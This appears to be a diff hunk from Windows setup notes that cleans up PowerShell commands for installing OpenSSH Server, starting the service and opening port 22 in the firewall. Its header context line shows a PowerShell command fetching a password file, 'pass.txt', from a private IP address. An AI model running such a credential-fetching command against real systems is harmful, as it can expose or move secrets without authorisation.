@@ -102,11 +102,11 @@ win_3: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/pass.txt').Conte
 __Install OpenSSH via PowerShell (Windows 10/11)__
 ```
 # Install OpenSSH 
-Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*' 
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 
 # Start SSH service 
-Start-Service sshd Set-Service -Name sshd -StartupType Automatic
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
 
 # Allow SSH through Firewall 
 New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
